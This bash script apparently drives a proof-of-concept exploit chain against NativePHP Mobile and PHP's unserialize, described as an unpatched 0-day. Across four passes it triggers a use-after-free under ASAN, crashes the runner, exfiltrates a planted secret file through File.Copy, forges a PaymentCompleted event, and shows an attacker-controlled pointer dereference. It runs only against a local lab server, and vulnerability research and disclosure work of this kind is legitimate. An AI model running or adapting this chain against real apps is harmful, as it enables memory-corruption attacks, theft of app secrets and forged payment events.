#!/bin/bash
# NativePHP Mobile 0-day lab — full chain receipt run.
# Simulates: attacker content in the app webview -> bridge POSTs -> File.Copy
# -> AsyncTask.Dispatch -> runner-lane unserialize -> VD re-entry UAF
# (unpatched in fully-patched PHP 8.5.12, same code as shipped 8.4.27).
set -u
LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
RECEIPTS=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/receipts
PHP8512=/tmp/php8512_build/plain2/sapi/cli/php
ASAN=/tmp/php8512_build/asan2/sapi/cli/php
PORT=8811

mkdir -p "$LAB/storage/framework/async/payload" "$LAB/storage/app/uploads" "$LAB/public" "$RECEIPTS"

# fresh state
rm -f "$LAB/storage/forged_event_fired.txt" "$LAB/public/leak.txt" \
      "$LAB/storage/framework/async/payload/"*.task "$LAB/storage/app/uploads/"*
# the "app secret" an attacker wants (any sandbox file works)
printf 'APP_SECRET=lab-secret-0xdeadbeef\nDB_PASSWORD=hunter2\n' > "$LAB/storage/app/secret.env"

wait_up() {
  for i in $(seq 1 40); do
    if curl -s -o /dev/null "http://127.0.0.1:$PORT/" 2>/dev/null; then return 0; fi
    sleep 0.25
  done
  echo "[FAIL] server did not come up"; return 1
}

start_server() {  # $1 = runner binary, $2 = USE_ZEND_ALLOC for runner
  NATIVEPHP_RUNNER_PHP="$1" LAB_RUNNER_ALLOC="$2" \
    "$PHP8512" -n -S "127.0.0.1:$PORT" "$LAB/harness.php" \
    > "$LAB/server.log" 2>&1 &
  SERVER_PID=$!
  wait_up
}

stop_server() { kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null; }

echo "############ PASS 1: VD UAF under ASAN (delivery: upload -> File.Copy -> AsyncTask.Dispatch) ############"
start_server "$ASAN" 0
python3 "$LAB/attack.py" "http://127.0.0.1:$PORT" "$LAB" chain > "$RECEIPTS/nativephp_vd_asan.log" 2>&1
stop_server
if grep -q "AddressSanitizer: heap-use-after-free" "$RECEIPTS/nativephp_vd_asan.log"; then
  echo "[PASS] ASAN heap-use-after-free receipt -> receipts/nativephp_vd_asan.log"
  grep -m1 -A4 "ERROR: AddressSanitizer" "$RECEIPTS/nativephp_vd_asan.log"
  grep -m1 "var_destroy" "$RECEIPTS/nativephp_vd_asan.log" && echo "  (stack shows var_destroy -> destructor -> re-entrant unserialize)"
else
  echo "[FAIL] no ASAN UAF — inspect receipts/nativephp_vd_asan.log"
fi

echo
echo "############ PASS 2: VD UAF manifest crash (plain binary, USE_ZEND_ALLOC=0 = glibc heap) ############"
start_server "$PHP8512" 0
python3 "$LAB/attack.py" "http://127.0.0.1:$PORT" "$LAB" chain > "$RECEIPTS/nativephp_vd_glibc.log" 2>&1
stop_server
EXIT=$(grep -o 'runner_exit = [0-9]*' "$RECEIPTS/nativephp_vd_glibc.log" | grep -o '[0-9]*$')
if [ -n "$EXIT" ] && [ "$EXIT" != "0" ]; then
  echo "[PASS] runner lane died mid-unserialize via HTTP delivery (exit=$EXIT; 139/134 = SIGSEGV/SIGABRT)"
else
  echo "[INFO] runner exit=$EXIT (on default ZendMM the freed-block write is silent-but-real; see ASAN pass)"
fi
grep -q "SURVIVED" "$RECEIPTS/nativephp_vd_glibc.log" && echo "[INFO] this build survived (silent corruption) — ASAN pass carries the receipt"

echo
echo "############ PASS 3: standalone criticals — file exfiltration + event forgery (no memory bug needed) ############"
start_server "$PHP8512" 1
python3 "$LAB/attack.py" "http://127.0.0.1:$PORT" "$LAB" exfil > "$RECEIPTS/nativephp_exfil.log" 2>&1
python3 "$LAB/attack.py" "http://127.0.0.1:$PORT" "$LAB" events > "$RECEIPTS/nativephp_eventforgery.log" 2>&1
stop_server
grep -q "lab-secret-0xdeadbeef" "$RECEIPTS/nativephp_exfil.log" \
  && { echo "[PASS] sandbox file exfiltrated via File.Copy + /_assets read-back"; grep EXFIL "$RECEIPTS/nativephp_exfil.log"; } \
  || echo "[FAIL] exfil — see receipts/nativephp_exfil.log"
if [ -s "$LAB/storage/forged_event_fired.txt" ]; then
  echo "[PASS] PaymentCompleted event forged with attacker payload:"
  cat "$LAB/storage/forged_event_fired.txt"
else
  echo "[FAIL] event forgery — see receipts/nativephp_eventforgery.log"
fi

echo
echo "############ PASS 4: controlled-pointer receipt through the FULL HTTP delivery (calib-stage spool payload) ############"
LAB_RUNNER_GDB=1 LAB_RUNNER_SCRIPT=runner_rce.php NATIVEPHP_RUNNER_PHP="$PHP8512" LAB_RUNNER_ALLOC=1 \
  "$PHP8512" -n -S "127.0.0.1:$PORT" "$LAB/harness.php" > "$LAB/server.log" 2>&1 &
SERVER_PID=$!
wait_up
python3 "$LAB/attack.py" "http://127.0.0.1:$PORT" "$LAB" calib 1017 > "$RECEIPTS/nativephp_vd_controlled_ptr.log" 2>&1
stop_server
if grep -q "SIGSEGV" "$RECEIPTS/nativephp_vd_controlled_ptr.log" && grep -q "0x4242424242424242" "$RECEIPTS/nativephp_vd_controlled_ptr.log"; then
  echo "[PASS] attacker-chosen pointer deref (rax=0x4242424242424242) through upload -> File.Copy -> AsyncTask.Dispatch"
  grep -E "SIGSEGV|php_var_unserialize|rax " "$RECEIPTS/nativephp_vd_controlled_ptr.log" | head -4
else
  echo "[INFO] controlled-ptr pass — see receipts/nativephp_vd_controlled_ptr.log (layout lottery; ASAN+SEGV passes above carry the UAF)"
fi

echo
echo "done."
